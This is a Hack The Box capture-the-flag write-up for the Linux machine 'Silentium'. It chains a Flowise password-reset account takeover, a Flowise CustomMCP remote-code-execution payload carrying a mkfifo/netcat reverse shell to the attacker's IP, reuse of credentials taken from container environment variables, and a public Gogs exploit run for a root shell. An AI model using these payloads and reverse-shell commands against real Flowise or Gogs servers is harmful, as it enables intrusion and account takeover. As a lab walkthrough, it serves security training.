# Hack The Box — Silentium

> **Difficulty:** Easy
> **OS:** Linux  
> **IP:** `10.129.245.103`  
> **Domain:** `silentium.htb`

---

# 1. Initial Recon

## Nmap

I started with a full TCP port scan using default scripts and service/version detection to identify the services running on the target:

```
nmap -sC -sV -p- --min-rate=1000 10.129.245.103
```

The scan revealed two open ports:

```
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15
80/tcp open  http    nginx 1.24.0 (Ubuntu)
```

The web server redirected requests to `silentium.htb`, so I added the hostname to my local hosts file.

## Add the Host to `/etc/hosts`

```
echo "10.129.245.103 silentium.htb" | sudo tee -a /etc/hosts
```

---

# 2. Web Enumeration

## Website Inspection

I navigated to `http://silentium.htb` and found a financial services website. The main page did not expose any immediately useful functionality, so I moved on to virtual host enumeration.

## Virtual Host Enumeration

I used FFUF to discover additional virtual hosts:

```
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt \
    -H "Host: FUZZ.silentium.htb" \
    -u http://silentium.htb \
    -ic -fc 301
```

The scan discovered a `staging` subdomain:

```
staging  [Status: 200, Size: 3142, Words: 789, Lines: 70]
```

I added it to `/etc/hosts`:

```
echo "10.129.245.103 staging.silentium.htb" | sudo tee -a /etc/hosts
```

## Directory Enumeration

Visiting `http://staging.silentium.htb` redirected me to a sign-in page. Since I did not have any credentials, I enumerated the application for accessible files and directories using Dirsearch:

```
dirsearch -u http://staging.silentium.htb
```

The scan returned several interesting endpoints:

```
401  /api/v1/
401  /api/v1/swagger.yaml
401  /api/v1/swagger.json
301  /assets  -> /assets/
200  /favicon.ico
200  /manifest.json
401  /ssc/api/v1/bulk
```

The `manifest.json` file was accessible without authentication:

```
http://staging.silentium.htb/manifest.json
```

Inspecting the application and its exposed resources revealed that it was using **Flowise**.

## Identify the Flowise Version

Since the API documentation endpoints were protected, I continued enumerating the API:

```
dirsearch -u http://staging.silentium.htb/api/v1
```

This revealed an accessible version endpoint:

```
200  /api/v1/version/
```

Navigating to the endpoint showed that the application was running:

```
Flowise 3.0.5
```

With the version identified, I started looking for publicly disclosed vulnerabilities affecting Flowise.

---

# 3. Initial Access — Flowise

## CVE-2025-58434 — Password Reset Vulnerability

Researching Flowise 3.0.5 led me to **CVE-2025-58434**.

The password-reset functionality was particularly interesting. When attempting to reset a password for an email address that did not belong to an existing account, the application returned:

```
User Not Found
```

This meant I could use the password-reset functionality to determine whether an email address was registered.

## Discover a Valid Email Address

I returned to the main website and inspected its Leadership section. It displayed three names:

- Marcus Thorne
    
- Ben
    
- Elena Rossi
    

Based on this information, I tested the email address:

```
ben@silentium.htb
```

The application accepted the address, confirming that it belonged to an existing account.

The password-reset response exposed sensitive account information, including the account ID, email address, password hash, and a temporary reset token.

The response contained an object similar to:

```
{
  "user": {
    "id": "<USER_ID>",
    "name": "admin",
    "email": "ben@silentium.htb",
    "credential": "<PASSWORD_HASH>",
    "tempToken": "<TEMPORARY_RESET_TOKEN>",
    "tokenExpiry": "<TOKEN_EXPIRY>",
    "status": "active"
  }
}
```

The important value was `tempToken`, which could be used to proceed with the password-reset process.

## Reset Ben's Password

I navigated to the reset-password page:

```
http://staging.silentium.htb/reset-password
```

Using the temporary token returned by the previous request, I reset the password for Ben's account.

After completing the reset, I logged in using Ben's credentials and gained access to the Flowise application.

---

# 4. Remote Code Execution — Flowise

## CVE-2025-59528 — CustomMCP Node

With authenticated access to Flowise, I continued researching vulnerabilities affecting the installed version.

I found **CVE-2025-59528**, a remote code execution vulnerability involving Flowise's `CustomMCP` node.

The vulnerability allowed attacker-controlled input to reach an unsafe execution path in the node configuration. This provided an opportunity to execute commands on the server.

## Prepare the Reverse Shell Payload

I created a JSON payload targeting the `customMCP` node.

The payload used Node.js's `child_process` module to execute a reverse shell command:

```
{
  "loadMethod": "listActions",
  "inputs": {
    "mcpServerConfig": "({x:(function(){const cp=process.mainModule.require('child_process');cp.exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.233 4455 >/tmp/f');return 1;})()} )"
  }
}
```

The command creates a named pipe and uses it to connect an interactive shell back to my attacking machine.

## Obtain the Reverse Shell

I started a Netcat listener:

```
nc -lvnp 4455
```

I then sent the payload to the vulnerable endpoint:

```
curl -X POST \
  http://staging.silentium.htb/api/v1/node-load-method/customMCP \
  -H "Authorization: Bearer <FLOWISE_BEARER_TOKEN>" \
  -H "Content-Type: application/json" \
  -d @payload.json
```

The request triggered the payload, and my listener received a reverse shell.

At this point, I had obtained code execution inside the Flowise environment.

---

# 5. Container Enumeration and Credential Discovery

## Confirm the Environment

After obtaining the shell, I started enumerating the filesystem.

Listing the root directory revealed a `.dockerenv` file:

```
ls -la /
```

The presence of this file indicated that I was operating inside a Docker container rather than directly on the host.

## Enumerate Environment Variables

I then inspected the environment variables:

```
env
```

Among the available configuration values, I discovered SMTP credentials. The sender email address was:

```
ben@silentium.htb
```

The SMTP password appeared to be reusable for SSH authentication.

## SSH as Ben

Using the recovered credentials, I attempted to authenticate over SSH:

```
ssh ben@silentium.htb
```

The credentials worked, giving me access to the host as the `ben` user.

I then checked my privileges:

```
id
```

I retrieved the user flag from Ben's home directory:

```
cat ~/user.txt
```

**User flag:** `USER_FLAG_HERE`

---

# 6. Privilege Escalation Enumeration

## Enumerate Internal Services

With SSH access to the host as `ben`, I enumerated the listening TCP services:

```
ss -tlnp
```

The output revealed an additional service listening only on localhost:

```
LISTEN  0  128  127.0.0.1:3001  0.0.0.0:*
```

Since port `3001` was not externally accessible, I decided to forward it through SSH.

## SSH Port Forwarding

I created a local tunnel:

```
ssh -f -N -L 3001:127.0.0.1:3001 ben@silentium.htb
```

This forwarded the target's local port `3001` to port `3001` on my attacking machine.

I could now access the internal service through:

```
http://127.0.0.1:3001
```

## Identify Gogs

Opening the forwarded port revealed a self-hosted Git service running **Gogs v0.13.0**.

I began investigating vulnerabilities affecting this version and came across **CVE-2025-8110**.

---

# 7. Root Privilege Escalation — Gogs

## CVE-2025-8110

CVE-2025-8110 affects Gogs and can be exploited to achieve remote code execution through its Git repository functionality.

I found a public proof of concept and cloned the repository:

```
git clone https://github.com/zAbuQasem/gogs-CVE-2025-8110
cd gogs-CVE-2025-8110
```

I installed the required Python dependencies:

```
pip install -r requirements.txt
```

## Register an Account Manually

The exploit script attempted to register an account automatically. However, Gogs had CAPTCHA enabled, preventing the automated registration process from completing.

I worked around this by registering an account manually through the web interface.

I navigated to:

```
http://127.0.0.1:3001/user/sign_up
```

I registered the following account:

```
Username: test
Password: Password123!
```

After registering, I generated an API token through:

```
http://127.0.0.1:3001/user/settings/applications
```

I selected **Generate New Token** and saved the generated token.

## Modify the Exploit Script

Since the account was already registered manually, I modified the exploit script to skip its registration step.

Inside `CVE-2025-8110.py`, I commented out the registration call:

```
# register(session, args.url, username, password)
login(session, args.url, username, password)
```

This allowed the script to authenticate using the existing account instead of attempting to register a new one.

## Execute the Exploit

I started a Netcat listener:

```
nc -lvnp 8443
```

I then executed the exploit against the locally forwarded Gogs instance:

```
python3 CVE-2025-8110.py \
    -u http://127.0.0.1:3001 \
    -lh 10.10.14.100 \
    -lp 8443
```

The script reported:

```
[+] Exploit sent, check your listener!
```

My listener received a shell with root privileges on the host.

## Verify Root Access

I verified the current user:

```
id
```

The result confirmed that I had obtained root access:

```
uid=0(root) gid=0(root) groups=0(root)
```

I also checked the hostname:

```
hostname
```

```
silentium
```

This confirmed that the shell was running as root on the Silentium host, not merely inside the original Flowise container.

---

# 8. Root Flag

With root access obtained, I read the root flag:

```
cat /root/root.txt
```

**Root flag:** `ROOT_FLAG_HERE`

---

# Attack Chain

1. **Reconnaissance:** Identified SSH and an Nginx web server on ports 22 and 80.
    
2. **Virtual host discovery:** Found `staging.silentium.htb` through FFUF.
    
3. **Application enumeration:** Discovered Flowise 3.0.5 through its exposed version endpoint.
    
4. **Initial access:** Abused the password-reset functionality associated with CVE-2025-58434 to reset Ben's account password.
    
5. **Remote code execution:** Exploited the vulnerable Flowise `CustomMCP` node through CVE-2025-59528 to obtain a shell inside the container.
    
6. **Credential discovery:** Found SMTP credentials in the container's environment variables.
    
7. **Lateral movement:** Reused the discovered credentials to SSH into the host as `ben`.
    
8. **Internal service discovery:** Found Gogs v0.13.0 listening on localhost port 3001.
    
9. **Root access:** Forwarded the Gogs service over SSH and exploited CVE-2025-8110 to obtain a root shell on the host.
    

---

# Vulnerabilities

|Vulnerability|Description|
|---|---|
|CVE-2025-58434|Flowise password-reset weakness that exposed a way to reset an existing user's password using a temporary token.|
|CVE-2025-59528|Remote code execution through the vulnerable Flowise `CustomMCP` node.|
|Credential exposure|SMTP credentials stored in environment variables could be reused for SSH authentication.|
|CVE-2025-8110|Gogs vulnerability exploited through the internal Git service to obtain root access on the host.|

---

# Key Takeaways

- **Enumerate virtual hosts:** Important applications may be exposed through subdomains rather than the main website.
    
- **Inspect exposed API endpoints:** Version information and application metadata can reveal vulnerable software.
    
- **Investigate password-reset functionality:** Improper handling of reset tokens can lead to account takeover.
    
- **Understand application-specific attack surfaces:** Flowise nodes and their configuration can introduce dangerous code-execution paths.
    
- **Check environment variables:** Containers may expose credentials that can be reused elsewhere in the environment.
    
- **Look for container boundaries:** A shell inside Docker does not necessarily mean host access.
    
- **Enumerate localhost services:** Internal applications can often be reached through SSH port forwarding.
    
- **Check self-hosted services:** Internal Git platforms may expose additional vulnerabilities and privilege-escalation paths.
    

---

# Flags

- **User:** `USER_FLAG_HERE`
    
- **Root:** `ROOT_FLAG_HERE`